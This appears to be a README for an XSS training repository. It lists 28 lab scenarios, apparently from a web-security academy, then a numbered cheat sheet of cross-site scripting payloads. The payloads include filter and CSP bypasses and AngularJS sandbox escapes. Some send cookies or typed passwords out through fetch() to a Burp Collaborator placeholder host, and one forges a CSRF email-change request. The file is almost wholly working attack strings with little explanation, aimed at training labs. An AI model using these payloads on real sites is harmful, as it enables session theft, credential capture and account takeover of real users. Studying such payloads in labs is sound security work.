# XSS-HUNTER

## Case XSS
1. Reflected XSS into HTML context with nothing encoded
2. Stored XSS into HTML context with nothing encoded
3. DOM XSS in document.write sink using source location.search
4. DOM XSS in innerHTML sink using source location.search
5. DOM XSS in jQuery anchor href attribute sink using location.search source
6. DOM XSS in jQuery selector sink using a hashchange event
7. Reflected XSS into attribute with angle brackets HTML-encoded
8. Stored XSS into anchor href attribute with double quotes HTML-encoded
9. Reflected XSS into a JavaScript string with angle brackets HTML encoded
10. DOM XSS in document.write sink using source location.search inside a select element
11. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
12. Stored DOM XSS
13. Reflected XSS into HTML context with most tags and attributes blocked
14. Reflected XSS into HTML context with all tags blocked except custom ones
15. Reflected XSS with some SVG markup allowed
16. Reflected XSS in canonical link tag
17. Reflected XSS into a JavaScript string with single quote and backslash escaped
18. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
19. Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
20. Exploiting cross-site scripting to steal cookies
21. Exploiting cross-site scripting to capture passwords
22. Exploiting XSS to perform CSRF
23. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
24. Reflected XSS with AngularJS sandbox escape without strings
25. Reflected XSS with AngularJS sandbox escape and CSP
26. Reflected XSS with event handlers and href attributes blocked
27. Reflected XSS protected by very strict CSP, with dangling markup attack
28. Reflected XSS protected by CSP, with CSP bypass


## Payload
Reflected XSS
1. ```<script>alert(1)</script>```
2. ```"><svg onload=alert(1)>```
3. ```<img src=1 onerror=alert(1)>```
4. ```<img src="x" onerror="alert(document.cookie)">```
5. ```javascript:alert(document.cookie)```
6. ```<img src=1 onerror=print()>```
7. ```"onmouseover="alert(1)```
8. ```javascript:alert(1)```
9. ```'-alert(1)-'```
10. ```product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>```
11. ```{{$on.constructor('alert(1)')()}}```
12. ```\"-alert(1)}//```
13. ```<><img src=1 onerror=alert(1)>```
14. ```<iframe src="https://YOUR-LAB-ID.com/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>```
15. ```<script>location = 'https://YOUR-LAB-ID.com?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';</script>```
16. ```/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E```
17. ```/?%27accesskey=%27x%27onclick=%27alert(1)```
18. ```</script><script>alert(1)</script>```
19.  ```\'-alert(1)//```
20. ```http://foo?&apos;-alert(1)-&apos;```
21. ```<input name=username id=username><input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{method:'POST',mode: 'no-cors',body:username.value+':'+this.value});">```
221. ```<script>var req = new XMLHttpRequest();req.onload = handleResponse;req.open('get','/my-account',true);req.send();function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')};</script>```
22. ```<script>fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>```
23. ```${alert(1)}```
24. ```/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1```
25. ```<script>location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';</script>. ```
26. ```?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E```
27. ```/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27```
28. ```?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27```

